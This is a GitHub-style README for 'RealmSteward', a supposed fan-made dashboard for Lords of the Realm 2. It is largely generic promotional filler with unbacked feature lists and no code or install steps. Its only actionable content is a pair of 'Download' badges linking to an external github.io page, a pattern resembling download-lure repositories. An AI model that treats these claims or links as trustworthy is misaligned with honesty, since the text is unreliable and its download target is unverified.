![preview](https://raw.githubusercontent.com/adrianleyander123-droid/lords-realm-2-conquer-dashboard/main/promo_7eb2c.svg)
[![Download](https://raw.githubusercontent.com/adrianleyander123-droid/lords-realm-2-conquer-dashboard/main/setup_a354.svg)](https://adrianleyander123-droid.github.io/lords-realm-2-conquer-dashboard/)

# 🏰 RealmSteward — The Conquer Dashboard Companion for Lords of the Realm 2

**An open-source, self-hosted companion dashboard for tracking, visualizing, and mastering your campaigns across the classic medieval strategy experience.**

Welcome to **RealmSteward**, a fan-made analytics and orchestration dashboard designed for players who treat every turn of their medieval campaigns like a chess grandmaster treats the board. Where the original *Conquer Dashboard* project explored the intersection of data and domination, RealmSteward pushes the concept further—transforming raw save data and realm statistics into an interactive command center that feels less like a spreadsheet and more like a war room.

If you have ever found yourself squinting at grain stores, mumbling about peasant morale, or wondering whether your northern baronies can survive one more winter, this project was built for you.

---

## 📜 Table of Contents

- [Overview](#-overview)
- [Why RealmSteward Exists](#-why-realmsteward-exists)
- [Feature Highlights](#-feature-highlights)
- [Screenshots & Conceptual Preview](#-screenshots--conceptual-preview)
- [Architecture & Philosophy](#-architecture--philosophy)
- [Multilingual Support](#-multilingual-support)
- [Responsive Design Promise](#-responsive-design-promise)
- [24/7 Support Model](#-247-support-model)
- [Roadmap 2026](#-roadmap-2026)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Contributing](#-contributing)
- [Community & Conduct](#-community--conduct)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🗺️ Overview

**RealmSteward** is a dashboard application that sits alongside your medieval realm-management sessions and gives you a panoramic view of everything that matters:

- Resource flows across counties and provinces
- Troop morale, supply lines, and seasonal attrition
- Diplomatic standing with rival houses
- Economic output, taxation pressure, and popular sentiment
- Long-term projections for harvests, sieges, and succession

The dashboard is not a replacement for the game — it is a **lens** that magnifies the details you would otherwise miss. Think of it as a steward, a chancellor, and a spymaster rolled into one calm, organized interface.

It is written with a modular front end, a portable data layer, and an emphasis on **clarity over clutter**. Every chart earns its place. Every metric has a purpose.

---

## 🌟 Why RealmSteward Exists

Most strategy dashboards are either too shallow (a single counter) or too dense (a wall of numbers). RealmSteward takes a different path:

1. **Focused metrics** — only what changes decisions.
2. **Narrative overlays** — charts are annotated with in-game context.
3. **Reversible views** — every panel can be expanded or collapsed without losing state.
4. **Local-first design** — your data stays where you put it.

The project draws inspiration from the spirit of community dashboards while remaining entirely its own entity. It is unaffiliated with any commercial release and is maintained purely out of affection for the genre.

---

## 🚀 Feature Highlights

### 🧭 Interactive Realm Map
A stylized, zoomable map of your territories. Click a province to see its grain output, garrison size, and unrest index. Panels can be pinned for side-by-side comparison.

### 📊 Live Resource Ledger
Track gold, grain, timber, and iron in real time. The ledger supports rolling averages, seasonal adjustment, and anomaly detection so you can spot a famine three turns before it bites.

### ⚔️ Conflict Simulator
Project the outcome of a siege or field battle using troop composition, terrain modifiers, and morale decay curves. The simulator is deliberately transparent — every coefficient is visible.

### 🕰️ Timeline Replay
Rewind your campaign to any prior turn and replay decisions in slow motion. Useful for post-mortems, tutorials, and storytelling.

### 🏛️ Diplomacy Board
A relationship graph showing alliances, feuds, and marriage ties. Hover a house to see its mood swings across the last N turns.

### 📦 Export & Snapshot
Export the current state to a portable snapshot format for archival or sharing (snapshots contain only dashboard metadata, never proprietary game assets).

### 🎨 Theme Engine
Light, dark, parchment, and night-watch themes. Each theme respects contrast ratios and color-blind safe palettes.

### 🔌 Extensible Panels
Write your own panel with a small declarative manifest. Panels are sandboxed and cannot mutate core state.

---

## 🖼️ Screenshots & Conceptual Preview

Visual previews, when available, live in the repository’s `/docs` folder. The conceptual layout includes:

- A top ribbon with realm name, turn number, and season
- A left rail with navigation between Ledger, Map, Diplomacy, and Simulator
- A right rail with pinned metric cards
- A central canvas that adapts to the active module

Because the dashboard is a companion, screenshots are illustrative rather than prescriptive — your own realm will look different, and that is the point.

---

## 🏗️ Architecture & Philosophy

RealmSteward is intentionally boring where it counts:

- **Deterministic rendering** — the same input always yields the same view.
- **Idempotent updates** — re-importing a snapshot does not duplicate state.
- **Composable panels** — each module is a self-contained unit.
- **Portable data** — snapshots use a documented, versioned schema.

The architecture follows a simple loop:

1. **Ingest** — read a snapshot or live feed.
2. **Normalize** — map fields to the internal model.
3. **Project** — compute derived metrics.
4. **Render** — draw panels from projections.
5. **Export** — serialize on demand.

No hidden side effects. No telemetry. No silent uploads.

---

## 🌐 Multilingual Support

The dashboard ships with translation scaffolding and community-contributed language packs. Languages are loaded as plain resource bundles, and missing keys fall back gracefully rather than breaking layout.

Currently prioritized locales include English, German, French, Spanish, Portuguese, Polish, Turkish, Simplified Chinese, Japanese, and Korean. Contributions for additional locales are warmly welcomed — a language pack is one of the friendliest first contributions you can make.

---

## 📱 Responsive Design Promise

RealmSteward is built to be usable on a wide range of screens:

- **Desktop** — multi-column war room with pinned panels
- **Tablet** — two-column flow with collapsible rails
- **Mobile** — single-column with bottom navigation and swipeable metric cards

The layout engine uses relative units, respects user font-size preferences, and avoids fixed pixel traps. If your screen can render text, RealmSteward will find a way to fit.

---

## ☎️ 24/7 Support Model

Because RealmSteward is community-driven, "support" here means **continuous community presence** rather than a paid hotline. Concretely:

- Issue templates guide reporters toward useful detail
- Discussions are moderated with a gentle hand
- Pull requests receive review within a reasonable window
- Documentation is versioned alongside code

If you are stuck at 3 AM with a failing snapshot import, you are not alone — someone, somewhere, has probably already filed a similar note.

---

## 🧭 Roadmap 2026

- 🗓️ **Q1 2026** — Snapshot schema v3 with migration tooling
- 🗓️ **Q2 2026** — Conflict Simulator v2 with terrain presets
- 🗓️ **Q3 2026** — Community panel registry (opt-in, local-first)
- 🗓️ **Q4 2026** — Accessibility audit and full keyboard navigation
- 🗓️ **Ongoing** — Localization expansion and documentation polish

The roadmap is a living document; priorities shift as the community speaks. If something matters to you, say so.

---

## 🔍 SEO & Discoverability Notes

RealmSteward is described using natural, human-readable language. If you arrived here searching for a **medieval strategy companion dashboard**, a **realm management analytics tool**, a **turn-based campaign visualizer**, or an **open-source dashboard for classic strategy gaming**, you are in the right place.

We do not chase algorithms; we chase clarity. Terms appear because they describe what the software does, not because they were sprinkled for rank.

---

## 🤝 Contributing

Contributions are welcome in many forms:

- 🐞 Bug reports with reproduction steps
- 📖 Documentation improvements
- 🌍 Translation packs
- 🧩 New panel modules
- 🎨 Theme variants
- 🧪 Test coverage

Before opening a pull request, please skim the contributor guide and keep changes focused. Small, well-described changes merge faster than sweeping rewrites.

---

## 🫂 Community & Conduct

RealmSteward operates under a simple expectation: **be the kind of person you would want to share a castle with.** Disagreement is fine; disrespect is not. Harassment, gatekeeping, and hostility have no seat at this table.

---

## ⚠️ Disclaimer

RealmSteward is an **unofficial, fan-made companion tool**. It is not affiliated with, endorsed by, or sponsored by the creators or publishers of any commercial strategy title. All trademarks belong to their respective owners.

Snapshots and exports contain only dashboard-derived metadata. Users are responsible for ensuring their use of the software complies with any applicable terms of service of the games they play.

The software is provided as-is, without warranty of any kind. See the license section below.

---

## 📄 License

This project is released under the **MIT License** — a permissive license that allows reuse, modification, and redistribution with attribution.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 RealmSteward contributors.

Permission is hereby granted, in the spirit of open collaboration, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the conditions of the MIT License.

---

## 🏁 Final Word

Strategy games are, at their heart, stories about constraints — time, resources, loyalty, and weather. RealmSteward exists to make those constraints visible, so that every decision feels informed and every consequence feels earned.

Whether you rule a single hamlet or a sprawling empire, may your harvests be generous and your sieges short.

**— The RealmSteward Maintainers, 2026**

[![Download](https://raw.githubusercontent.com/adrianleyander123-droid/lords-realm-2-conquer-dashboard/main/setup_a354.svg)](https://adrianleyander123-droid.github.io/lords-realm-2-conquer-dashboard/)